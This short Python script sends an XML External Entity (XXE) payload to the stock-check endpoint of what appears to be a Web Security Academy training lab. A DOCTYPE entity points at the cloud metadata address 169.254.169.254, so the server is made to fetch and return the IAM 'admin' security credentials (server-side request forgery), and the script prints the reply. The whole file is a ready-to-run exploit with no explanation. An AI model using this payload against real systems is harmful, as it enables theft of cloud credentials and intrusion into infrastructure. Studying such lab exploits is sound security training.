#!/usr/bin/python3

import requests

def connect(url, endpoint, payload, payload_exec):

    xml = """<?xml version="1.0" encoding="UTF-8"?>""" + payload + """<stockCheck><productId>""" + payload_exec + """</productId><storeId>1</storeId></stockCheck>"""

    headers = {
        'Content-Type': 'application/xml',
    }

    r = requests.post(url + endpoint, headers=headers, data=xml)
    print(r.text)
    
if __name__ == '__main__':
    url = "https://aca31f891fa6cb19c0a00c25005d0091.web-security-academy.net"
    endpoint = "/product/stock"
    ssrf = "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"
    payload = '<!DOCTYPE foo [ <!ENTITY bigb0ss SYSTEM "' + ssrf + '"> ]>'
    payload_exec = """&bigb0ss;"""

    connect(url, endpoint, payload, payload_exec)